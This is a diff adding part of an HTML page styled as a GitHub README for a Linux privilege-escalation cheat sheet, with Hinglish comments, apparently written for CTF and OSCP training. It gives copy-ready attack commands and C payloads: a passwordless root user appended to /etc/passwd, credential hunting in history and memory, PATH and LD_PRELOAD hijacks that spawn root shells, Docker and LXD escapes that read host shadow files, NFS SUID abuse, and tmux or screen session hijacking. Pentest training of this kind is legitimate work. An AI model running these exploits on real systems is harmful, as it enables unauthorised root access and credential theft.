+
+        <hr class="section-divider">
+
+        <h2 id="perms">🔓 Weak Permissions</h2>
+
+        <h3>Read/Write /etc/shadow</h3>
+        <pre data-lang="bash"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.parentElement.querySelector('code').innerText);this.textContent='Copied!'">Copy</button><code><span class="cmt"># Hash crack</span>
+<span class="kw">mkpasswd</span> -m SHA-512 hacker
+<span class="cmt"># Ya directly edit karo shadow file</span>
+
+<span class="cmt"># /etc/passwd world-writable ho to</span>
+<span class="kw">echo</span> <span class="str">'hacker::0:0::/root:/bin/bash'</span> &gt;&gt;/etc/passwd
+<span class="kw">su</span> hacker   <span class="cmt"># no password → root shell!</span></code></pre>
+
+        <h3>Credential Hunting</h3>
+        <pre data-lang="bash"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.parentElement.querySelector('code').innerText);this.textContent='Copied!'">Copy</button><code><span class="cmt"># History mein passwords dhundho</span>
+<span class="kw">history</span> | <span class="kw">grep</span> -i -E <span class="str">'\-p|\-pass|\-password|:.*@'</span>
+
+<span class="cmt"># Files mein password keyword search</span>
+<span class="kw">grep</span> -ri <span class="str">"password"</span> /var /etc /home 2&gt;/dev/null
+
+<span class="cmt"># Memory dump (mimipenguin)</span>
+./mimipenguin.sh
+
+<span class="cmt"># Process dump</span>
+<span class="kw">gcore</span> <span class="var">&lt;PID&gt;</span> ; strings core* | <span class="kw">grep</span> -i pass</code></pre>
+
+        <hr class="section-divider">
+
+        <h2 id="binary">⚙️ Binary Exploitation</h2>
+
+        <table>
+          <tr><th>#</th><th>Technique</th><th>Condition</th><th>Key Command</th></tr>
+          <tr><td>1</td><td>PATH Manipulation</td><td>Binary calls subcommand without full path</td><td><code>export PATH=/tmp:$PATH</code></td></tr>
+          <tr><td>2</td><td>.so Injection</td><td>Writable shared library path</td><td><code>gcc -shared -fPIC shell.c -o lib.so</code></td></tr>
+          <tr><td>3</td><td>LD_PRELOAD</td><td>env_keep+=LD_PRELOAD in sudoers</td><td><code>sudo LD_PRELOAD=/tmp/evil.so cmd</code></td></tr>
+          <tr><td>4</td><td>Python Hijack</td><td>Writable script directory</td><td><code>echo "import pty;pty.spawn('/bin/sh')" > module.py</code></td></tr>
+          <tr><td>5</td><td>Overwrite Binary</td><td>Write permission on executable</td><td><code>echo "/bin/bash" >> /usr/bin/target</code></td></tr>
+          <tr><td>10</td><td>Full Path (bash &lt;4.2)</td><td>Binary calls full path executable</td><td><code>function /usr/bin/prog() { /bin/bash; }; export -f /usr/bin/prog</code></td></tr>
+          <tr><td>11</td><td>Debug Mode (bash &lt;4.4)</td><td>Script runs with xtrace</td><td><code>env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/x && chmod +s /tmp/x)'</code></td></tr>
+        </table>
+
+        <h3>PATH Hijacking — Full Example</h3>
+        <pre data-lang="c"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.parentElement.querySelector('code').innerText);this.textContent='Copied!'">Copy</button><code><span class="cmt">// /tmp/rotexec.c - malicious binary</span>
+<span class="kw">#include</span> <span class="str">&lt;stdio.h&gt;</span>
+<span class="kw">#include</span> <span class="str">&lt;stdlib.h&gt;</span>
+
+<span class="fn">int</span> <span class="fn">main</span>() {
+    <span class="fn">setgid</span>(<span class="num">0</span>);
+    <span class="fn">setuid</span>(<span class="num">0</span>);
+    <span class="fn">system</span>(<span class="str">"/bin/bash"</span>);
+    <span class="kw">return</span> <span class="num">0</span>;
+}</code></pre>
+        <pre data-lang="bash"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.parentElement.querySelector('code').innerText);this.textContent='Copied!'">Copy</button><code><span class="kw">gcc</span> /tmp/rotexec.c -o /tmp/rotexec
+<span class="kw">export</span> <span class="var">PATH</span>=/tmp:<span class="var">$PATH</span>
+<span class="kw">sudo</span> /usr/bin/mainbinary   <span class="cmt"># rotexec ko call karega → root shell!</span></code></pre>
+
+        <hr class="section-divider">
+
+        <h2 id="env">🌐 Environment Variable Exploits</h2>
+
+        <h3>LD_PRELOAD</h3>
+        <div class="alert alert-note">
+          <div class="alert-title">ℹ️ Note</div>
+          <code>sudo -l</code> mein <code>env_keep+=LD_PRELOAD</code> line check karo. Agar hai to yeh kaam karega.
+        </div>
+        <pre data-lang="c"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.parentElement.querySelector('code').innerText);this.textContent='Copied!'">Copy</button><code><span class="cmt">// /tmp/pe.c</span>
+<span class="kw">#include</span> <span class="str">&lt;stdio.h&gt;</span>
+<span class="kw">#include</span> <span class="str">&lt;sys/types.h&gt;</span>
+<span class="kw">#include</span> <span class="str">&lt;stdlib.h&gt;</span>
+
+<span class="fn">void</span> _init() {
+    <span class="fn">unsetenv</span>(<span class="str">"LD_PRELOAD"</span>);
+    <span class="fn">setgid</span>(<span class="num">0</span>);
+    <span class="fn">setuid</span>(<span class="num">0</span>);
+    <span class="fn">system</span>(<span class="str">"/bin/bash"</span>);
+}</code></pre>
+        <pre data-lang="bash"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.parentElement.querySelector('code').innerText);this.textContent='Copied!'">Copy</button><code><span class="kw">gcc</span> -fPIC -shared -o /tmp/pe.so /tmp/pe.c -nostartfiles
+<span class="kw">sudo</span> <span class="var">LD_PRELOAD</span>=/tmp/pe.so apache2 restart</code></pre>
+
+        <h3>LD_LIBRARY_PATH Hijacking</h3>
+        <pre data-lang="bash"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.parentElement.querySelector('code').innerText);this.textContent='Copied!'">Copy</button><code><span class="cmt"># Binary ke linked libraries dhundho</span>
+<span class="kw">ldd</span> /usr/bin/sudo
+
+<span class="cmt"># Usi naam ki malicious lib banao</span>
+<span class="kw">gcc</span> -o /tmp/libutil.so -shared -fPIC /tmp/hijack_lib.c
+<span class="kw">sudo</span> <span class="var">LD_LIBRARY_PATH</span>=/tmp /usr/bin/sudo</code></pre>
+
+        <hr class="section-divider">
+
+        <h2 id="container">🐳 Container Breakout</h2>
+
+        <h3>Docker</h3>
+        <pre data-lang="bash"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.parentElement.querySelector('code').innerText);this.textContent='Copied!'">Copy</button><code><span class="cmt"># Host filesystem mount karke root access</span>
+<span class="kw">sudo</span> docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+
+<span class="cmt"># Ab container mein ho - host /etc/passwd edit karo</span>
+<span class="kw">echo</span> <span class="str">'hacker::0:0::/root:/bin/bash'</span> &gt;&gt;/etc/passwd
+<span class="kw">exit</span>
+<span class="kw">su</span> hacker  <span class="cmt"># → root on host!</span></code></pre>
+
+        <h3>LXD</h3>
+        <pre data-lang="bash"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.parentElement.querySelector('code').innerText);this.textContent='Copied!'">Copy</button><code><span class="cmt"># Attacker machine pe</span>
+<span class="kw">git</span> clone https://github.com/saghul/lxd-alpine-builder
+./build-alpine
+<span class="cmt"># alpine-v3.x...tar.gz milega - victim pe transfer karo</span>
+
+<span class="cmt"># Victim machine pe</span>
+<span class="kw">lxd</span> init    <span class="cmt"># sab ke liye Enter</span>
+<span class="kw">lxc</span> image import ./alpine*.tar.gz --alias hacked
+<span class="kw">lxc</span> init hacked hacked-container -c security.privileged=true
+<span class="kw">lxc</span> config device add hacked-container mydevice disk source=/ path=/mnt/hacked
+<span class="kw">lxc</span> start hacked-container
+<span class="kw">lxc</span> exec hacked-container /bin/sh
+<span class="cmt"># → ab container mein root ho, /mnt/hacked mein host files hain</span>
+<span class="kw">cat</span> /mnt/hacked/etc/shadow</code></pre>
+
+        <hr class="section-divider">
+
+        <h2 id="nfs">📁 NFS no_root_squash</h2>
+
+        <div class="alert alert-danger">
+          <div class="alert-title">🔴 High Impact</div>
+          Agar NFS share pe <code>no_root_squash</code> set hai to attacker root se SUID binary upload kar sakta hai.
+        </div>
+
+        <pre data-lang="bash"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.parentElement.querySelector('code').innerText);this.textContent='Copied!'">Copy</button><code><span class="cmt"># Attacker machine (as root)</span>
+<span class="kw">showmount</span> -e <span class="var">&lt;target-IP&gt;</span>
+<span class="kw">mount</span> -o rw <span class="var">&lt;IP&gt;</span>:/share /mnt
+
+<span class="kw">cp</span> /bin/sh /mnt/sh
+<span class="kw">chmod</span> +s /mnt/sh     <span class="cmt"># SUID set - owner root hai</span>
+
+<span class="cmt"># Victim machine</span>
+<span class="kw">ls</span> -la /share/sh     <span class="cmt"># -rwsr-xr-x  root root</span>
+/share/sh -p         <span class="cmt"># → root shell!</span></code></pre>
+
+        <hr class="section-divider">
+
+        <h2 id="session">👻 Session Hijacking</h2>
+
+        <h3>Screen</h3>
+        <pre data-lang="bash"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.parentElement.querySelector('code').innerText);this.textContent='Copied!'">Copy</button><code><span class="kw">screen</span> -ls                        <span class="cmt"># sessions list</span>
+<span class="kw">screen</span> -dr 7120.pts-1.XTeam     <span class="cmt"># hijack + detach existing</span></code></pre>
+
+        <h3>Tmux</h3>
+        <pre data-lang="bash"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.parentElement.querySelector('code').innerText);this.textContent='Copied!'">Copy</button><code><span class="kw">tmux</span> ls                           <span class="cmt"># sessions dhundho</span>
+<span class="kw">tmux</span> -S /tmp/dev_sess ls          <span class="cmt"># socket ke through</span>
+<span class="kw">tmux</span> attach -t 0 -d               <span class="cmt"># hijack!</span></code></pre>
+
+        <hr class="section-divider">
+
+        <h2 id="tools">🛠️ Automated Tools</h2>
+
+        <table>
+          <tr><th>Tool</th><th>Command</th><th>Best For</th></tr>
+          <tr><td><a href="#">LinPEAS</a></td><td><code>./linpeas.sh -e</code></td><td>Comprehensive enum, colored output</td></tr>
+          <tr><td><a href="#">LinEnum</a></td><td><code>./LinEnum.sh</code></td><td>Quick overview</td></tr>
+          <tr><td><a href="#">linux-exploit-suggester</a></td><td><code>./les.sh -k $(uname -r)</code></td><td>Kernel CVE matching</td></tr>
+          <tr><td><a href="#">linuxprivchecker</a></td><td><code>python linuxprivchecker.py</code></td><td>Python-based checks</td></tr>
+          <tr><td><a href="#">pspy</a></td><td><code>./pspy64</code></td><td>Real-time process monitoring</td></tr>
+          <tr><td><a href="#">GTFOBins</a></td><td>gtfobins.github.io</td><td>SUID/SUDO binary lookup</td></tr>
+          <tr><td><a href="#">mimipenguin</a></td><td><code>./mimipenguin.sh</code></td><td>Memory credential dump</td></tr>
+        </table>
+
+        <hr class="section-divider">
+
+        <h2>🤝 Contributing</h2>
+        <p>Agar tumhare paas koi naya technique, fix ya improvement hai to PR bhejo! Issues section mein requests bhi de sakte ho.</p>
+        <pre data-lang="bash"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.parentElement.querySelector('code').innerText);this.textContent='Copied!'">Copy</button><code><span class="kw">git</span> clone https://github.com/CyberPublicSchool/linux-privilege-escalation
+<span class="kw">cd</span> linux-privilege-escalation
+<span class="kw">git</span> checkout -b feature/new-technique
+<span class="cmt"># apni changes karo</span>
+<span class="kw">git</span> push origin feature/new-technique
+<span class="cmt"># PR submit karo!</span></code></pre>
+
+        <hr class="section-divider">
+        <p style="color:var(--muted); font-size:13px; text-align:center;">© 2026 Cyber Public School · Cyber Security Training & OSCP Mentorship · All Rights Reserved</p>
+
+      </div>
+    </div>
+  </div><!-- /left -->
+
+  <!-- RIGHT SIDEBAR -->
+  <div class="sidebar">
+
+    <div class="sidebar-box">
+      <div class="sidebar-title">About</div>
+      <div class="sidebar-desc">Complete Linux Privilege Escalation reference for CTF &amp; Pentesters</div>
+      <div class="sidebar-tags">
+        <span class="sidebar-tag">linux</span>
+        <span class="sidebar-tag">privesc</span>
+        <span class="sidebar-tag">ctf</span>
+        <span class="sidebar-tag">security</span>
+        <span class="sidebar-tag">suid</span>
+        <span class="sidebar-tag">exploit</span>
+      </div>
+      <div class="sidebar-stat">
+        <svg viewBox="0 0 16 16"><path d="M8 .25a.75.75 0 01.673.418l1.882 3.815 4.21.612a.75.75 0 01.416 1.279l-3.046 2.97.719 4.192a.75.75 0 01-1.088.791L8 12.347l-3.766 1.98a.75.75 0 01-1.088-.79l.72-4.194L.818 6.374a.75.75 0 01.416-1.28l4.21-.611L7.327.668A.75.75 0 018 .25zm0 2.445L6.615 5.5a.75.75 0 01-.564.41l-3.097.45 2.24 2.184a.75.75 0 01.216.664l-.528 3.084 2.769-1.456a.75.75 0 01.698 0l2.77 1.456-.53-3.084a.75.75 0 01.216-.664l2.24-2.183-3.096-.45a.75.75 0 01-.564-.41L8 2.694z"/></svg>
+        <span class="s-num">847</span> stars
+      </div>
+      <div class="sidebar-stat">
+        <svg viewBox="0 0 16 16"><path d="M5 3.25a.75.75 0 11-1.5 0 .75.75 0 011.5 0zm0 2.122a2.25 2.25 0 10-1.5 0v.878A2.25 2.25 0 005.75 8.5h1.5v2.128a2.251 2.251 0 101.5 0V8.5h1.5a2.25 2.25 0 002.25-2.25v-.878a2.25 2.25 0 10-1.5 0v.878a.75.75 0 01-.75.75h-4.5A.75.75 0 015 6.25v-.878zm3.75 7.378a.75.75 0 11-1.5 0 .75.75 0 011.5 0zm3-8.75a.75.75 0 11-1.5 0 .75.75 0 011.5 0z"/></svg>
+        <span class="s-num">312</span> forks
+      </div>
+      <div class="sidebar-stat">
+        <svg viewBox="0 0 16 16"><path d="M8 9.5a1.5 1.5 0 100-3 1.5 1.5 0 000 3z"/><path d="M8 0a8 8 0 100 16A8 8 0 008 0zM1.5 8a6.5 6.5 0 1113 0 6.5 6.5 0 01-13 0z"/></svg>
+        <span class="s-num">23</span> watching
+      </div>
+    </div>
+
+    <div class="sidebar-box">
+      <div class="sidebar-title">Releases</div>
+      <div style="font-size:13px; color:var(--muted);">
+        <div style="display:flex; align-items:center; gap:8px; margin-bottom:8px;">
+          <span style="background:#1f3a1f; color:#3fb950; border:1px solid #238636; border-radius:20px; padding:1px 8px; font-size:11px;">v2.1.0</span>
+          <span>Latest</span>
+        </div>
+        <div style="color:var(--muted); font-size:12px;">Added container breakout, NFS exploitation</div>
+      </div>
+    </div>
+
+    <div class="sidebar-box">
+      <div class="sidebar-title">Languages</div>
+      <div class="lang-bar" style="margin-bottom:12px;">
+        <div class="lang-seg" style="width:52%; background:#f0db4f;" title="Shell"></div>
+        <div class="lang-seg" style="width:28%; background:#3572A5;" title="Python"></div>
+        <div class="lang-seg" style="width:14%; background:#555555;" title="C"></div>
+        <div class="lang-seg" style="width:6%; background:#e34c26;" title="HTML"></div>
+      </div>
+      <div class="lang-list">
+        <div class="lang-item"><div class="lang-dot" style="background:#f0db4f;"></div><span class="lang-name">Shell</span><span class="lang-pct">52%</span></div>
+        <div class="lang-item"><div class="lang-dot" style="background:#3572A5;"></div><span class="lang-name">Python</span><span class="lang-pct">28%</span></div>
+        <div class="lang-item"><div class="lang-dot" style="background:#555555;"></div><span class="lang-name">C</span><span class="lang-pct">14%</span></div>
+        <div class="lang-item"><div class="lang-dot" style="background:#e34c26;"></div><span class="lang-name">Other</span><span class="lang-pct">6%</span></div>
+      </div>
+    </div>
+
+    <div class="sidebar-box">
+      <div class="sidebar-title">Contributors <span style="color:var(--muted); font-weight:400;">6</span></div>
+      <div class="contributors">
+        <div class="contrib-avatar" style="--c1:#58a6ff;--c2:#3fb950;" title="CyberPublicSchool">XY</div>
+        <div class="contrib-avatar" style="--c1:#ff7b72;--c2:#ffa657;" title="s0fs">SO</div>
+        <div class="contrib-avatar" style="--c1:#bc8cff;--c2:#58a6ff;" title="r00tk1t">RK</div>
+        <div class="contrib-avatar" style="--c1:#3fb950;--c2:#e3b341;" title="h4x0r">HX</div>
+        <div class="contrib-avatar" style="--c1:#ffa657;--c2:#ff7b72;" title="pwn3r">PW</div>
+        <div class="contrib-avatar" style="--c1:#e3b341;--c2:#bc8cff;" title="0xghost">GH</div>
+      </div>
+    </div>
+
+  </div><!-- /sidebar -->
+
+</div><!-- /content-wrap -->
+
+<!-- FOOTER -->
+<footer class="gh-footer">
+  <span>© 2024 GitHub, Inc.</span>
+  <a href="#">Terms</a>
+  <a href="#">Privacy</a>
+  <a href="#">Security</a>
+  <a href="#">Status</a>
+  <a href="#">Docs</a>
+  <a href="#">Contact</a>
+  <span style="margin-left:auto;">🐧 linux-privilege-escalation</span>
+</footer>
+
+</body>
+</html>
